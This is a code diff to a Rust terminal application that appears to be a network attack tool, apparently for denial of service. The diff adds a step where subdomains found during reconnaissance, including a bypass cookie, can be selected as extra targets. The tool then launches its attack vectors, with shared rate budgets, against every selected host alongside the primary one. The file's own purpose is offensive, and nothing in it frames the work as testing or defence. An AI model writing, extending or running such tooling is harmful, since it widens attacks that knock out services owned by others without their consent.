@@ -1,6 +1,7 @@
 //! Application state and input handling.
 
 use std::collections::VecDeque;
+use std::net::Ipv4Addr;
 use std::sync::atomic::{AtomicBool, AtomicU32};
 use std::sync::Arc;
 use std::time::Instant;
@@ -23,6 +24,13 @@ pub enum Phase {
     Ready,
     Running,
     Stopped,
+    Subdomains,
+}
+
+pub struct SubSel {
+    pub name: String,
+    pub ips: Vec<Ipv4Addr>,
+    pub selected: bool,
 }
 
 pub struct ScanOutcome {
@@ -55,6 +63,9 @@ pub struct App {
     pub limit_secs: u64,
     pub health: Option<Arc<Health>>,
     pub recon: Option<Arc<bypass::Recon>>,
+    pub subs: Vec<SubSel>,
+    pub sub_cursor: usize,
+    pub extra_targets: Vec<Target>,
     samples: VecDeque<(Instant, u64, u64)>,
     scan_rx: Option<mpsc::Receiver<ScanOutcome>>,
     port_rx: Option<mpsc::UnboundedReceiver<u16>>,
@@ -115,6 +126,9 @@ impl App {
             health_stop: None,
             health: None,
             recon: None,
+            subs: Vec::new(),
+            sub_cursor: 0,
+            extra_targets: Vec::new(),
         }
     }
 
@@ -318,7 +332,25 @@ impl App {
         };
         self.recon_rx = None;
         self.note(format!("recon: {}", bypass::summary(&r)));
+        let has_subs = !r.subs.is_empty();
+        self.subs = r
+            .subs
+            .iter()
+            .map(|s| SubSel {
+                name: s.name.clone(),
+                ips: s.ips.clone(),
+                selected: false,
+            })
+            .collect();
+        self.sub_cursor = 0;
         self.recon = Some(Arc::new(r));
+        if has_subs && self.phase == Phase::Ready {
+            self.phase = Phase::Subdomains;
+            self.message = format!(
+                "{} subdomains found - Space select, Enter confirm, Esc skip",
+                self.subs.len()
+            );
+        }
     }
 
     pub fn begin_attack(&mut self) {
@@ -352,18 +384,30 @@ impl App {
                 .unwrap_or(80)
         });
 
-        let ctx = Arc::new(Ctx {
-            target: t.clone(),
-            port,
-            iface: self.iface.clone(),
-            raw,
-            stats: stats.clone(),
-            cookie: self.recon.as_ref().and_then(|r| r.cookie.clone()),
-            budgets: ALL
-                .iter()
-                .map(|s| Arc::new(attack::Budget::new(attack::raw_rate(s.vector))))
-                .collect(),
-        });
+        let budgets: Vec<Arc<attack::Budget>> = ALL
+            .iter()
+            .map(|s| Arc::new(attack::Budget::new(attack::raw_rate(s.vector))))
+            .collect();
+        attack::spawn_refill(budgets.clone(), stats.clone());
+        let cookie = self.recon.as_ref().and_then(|r| r.cookie.clone());
+
+        let mut targets: Vec<(Target, u16)> = vec![(t.clone(), port)];
+        for e in &self.extra_targets {
+            targets.push((e.clone(), e.port.unwrap_or(port)));
+        }
+        let n_targets = targets.len();
+        for (tg, tp) in targets {
+            let ctx = Arc::new(Ctx {
+                target: tg,
+                port: tp,
+                iface: self.iface.clone(),
+                raw: raw.clone(),
+                stats: stats.clone(),
+                cookie: cookie.clone(),
+                budgets: budgets.clone(),
+            });
+            attack::launch(ctx, vectors.clone());
+        }
 
         let h = Arc::new(Health::new());
         let stop = Arc::new(AtomicBool::new(false));
@@ -372,15 +416,15 @@ impl App {
         self.health_stop = Some(stop);
 
         self.note(format!(
-            "attacking {ip}:{port} with {} vectors{}",
+            "attacking {ip}:{port} with {} vectors on {} target(s){}",
             vectors.len(),
+            n_targets,
             if self.limit_secs > 0 {
                 format!(" for {}m", self.limit_secs / 60)
             } else {
                 String::new()
             }
         ));
-        attack::launch(ctx, vectors);
         self.stats = Some(stats);
         self.started_at = Some(Instant::now());
         self.deadline = if self.limit_secs > 0 {
@@ -450,6 +494,55 @@ impl App {
             Phase::Ready => self.key_ready(k),
             Phase::Running => self.key_running(k),
             Phase::Stopped => self.key_stopped(k),
+            Phase::Subdomains => self.key_subs(k),
+        }
+    }
+
+    fn key_subs(&mut self, k: KeyEvent) {
+        match k.code {
+            KeyCode::Up => self.sub_cursor = self.sub_cursor.saturating_sub(1),
+            KeyCode::Down => {
+                if !self.subs.is_empty() {
+                    self.sub_cursor = (self.sub_cursor + 1).min(self.subs.len() - 1);
+                }
+            }
+            KeyCode::Char(' ') => {
+                if let Some(s) = self.subs.get_mut(self.sub_cursor) {
+                    s.selected = !s.selected;
+                }
+            }
+            KeyCode::Char('a') => {
+                let all = self.subs.iter().all(|s| s.selected);
+                for s in &mut self.subs {
+                    s.selected = !all;
+                }
+            }
+            KeyCode::Enter => {
+                self.extra_targets = self
+                    .subs
+                    .iter()
+                    .filter(|s| s.selected)
+                    .filter_map(|s| {
+                        let mut t = self.target.clone()?;
+                        t.host = s.name.clone();
+                        t.ips = s.ips.clone();
+                        Some(t)
+                    })
+                    .collect();
+                let n = self.extra_targets.len();
+                self.phase = Phase::Ready;
+                self.message = if n > 0 {
+                    format!("{n} extra subdomains will also be hit - Enter to start")
+                } else {
+                    "primary target only - Enter to start".into()
+                };
+            }
+            KeyCode::Esc => {
+                self.extra_targets.clear();
+                self.phase = Phase::Ready;
+                self.message = "primary target only - Enter to start".into();
+            }
+            _ => {}
         }
     }
 
